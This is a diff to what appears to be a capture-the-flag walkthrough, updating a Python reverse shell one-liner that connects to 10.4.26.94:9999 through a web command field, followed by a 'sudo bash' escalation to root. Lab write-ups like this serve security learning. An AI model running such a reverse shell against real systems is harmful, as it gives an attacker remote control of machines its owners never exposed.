@@ -56,7 +56,7 @@ Password: Wubbalubbadubdub
 2. Run the following python revshell payload into the `portal.php` command field.
 Python3 revshell payload:
 > ```bash
-> python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.26.94",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+> python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.26.94",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 > ```
 3. In this machine, the user has unlimited sudo privilege. go to root with `sudo bash`
 
